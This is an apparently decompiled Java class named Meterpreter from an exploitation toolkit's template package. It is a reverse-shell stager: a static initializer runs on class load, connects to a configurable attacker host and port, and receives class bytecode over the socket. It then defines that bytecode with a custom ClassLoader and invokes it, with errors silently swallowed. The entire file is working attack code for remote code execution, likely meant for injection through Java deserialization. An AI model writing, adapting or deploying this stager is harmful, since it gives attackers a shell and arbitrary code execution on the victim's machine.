package com.qi4l.JYso.template;/*
 * Decompiled with CFR 0.152.
 */

import java.io.DataInputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.HashMap;

public class Meterpreter
        extends ClassLoader
        implements Runnable {
    static {

        Meterpreter meterpreter = new Meterpreter();
        meterpreter.initLhost();
        meterpreter.run();
    }

    public String host;
    public String port;
    private HashMap<String, byte[]> parameterMap;

    public static void main(String[] args) {
        Meterpreter meterpreter = new Meterpreter();
        meterpreter.run();
    }

    public void initLhost() {
        this.host = "";
        this.port = "";
    }

    public String toString() {
        if (this.host != null && this.port != null) {
            Thread thread = new Thread(this);
            thread.start();
            this.parameterMap.put("result", "ok".getBytes());
        } else {
            this.parameterMap.put("result", "host or port is null".getBytes());
        }
        this.parameterMap = null;
        return "";
    }

    @SuppressWarnings("unchecked")
    public boolean equals(Object paramObject) {
        if (!(paramObject instanceof HashMap)) {
            return false;
        }
        try {
            this.parameterMap = (HashMap<String, byte[]>) paramObject;
            this.host = this.get("host");
            this.port = this.get("port");
        } catch (Exception e) {
            return false;
        }
        return true;
    }

    public void getShell() throws Exception {
        int j = Integer.parseInt(this.port);
        String str4 = this.host;
        if (str4 == null) {
            return;
        }
        try (Socket socket = new Socket(str4, j)) {
            InputStream inputStream1 = socket.getInputStream();
            OutputStream outputStream = socket.getOutputStream();
            new Meterpreter().bootstrap(inputStream1, outputStream);
        }
    }

    private void bootstrap(InputStream paramInputStream, OutputStream paramOutputStream) {
        try {
            Class<?> clazz;
            DataInputStream dataInputStream = new DataInputStream(paramInputStream);
            int i = dataInputStream.readInt();
            do {
                byte[] arrayOfByte = new byte[i];
                dataInputStream.readFully(arrayOfByte);
                clazz = this.defineClass(null, arrayOfByte, 0, i);
                this.resolveClass(clazz);
            } while ((i = dataInputStream.readInt()) > 0);
            Object object = clazz.getDeclaredConstructor().newInstance();
            clazz.getMethod("start", DataInputStream.class, OutputStream.class, String[].class)
                .invoke(object, dataInputStream, paramOutputStream, new String[]{"", ""});
        } catch (Throwable throwable) {
            // empty catch block
        }
    }

    @Override
    @SuppressWarnings("CallToPrintStackTrace")
    public void run() {
        try {
            this.getShell();
        } catch (Exception exception) {
            exception.printStackTrace();
            // empty catch block
        }
    }

    public String get(String key) {
        try {
            return new String(this.parameterMap.get(key));
        } catch (Exception e) {
            return null;
        }
    }
}
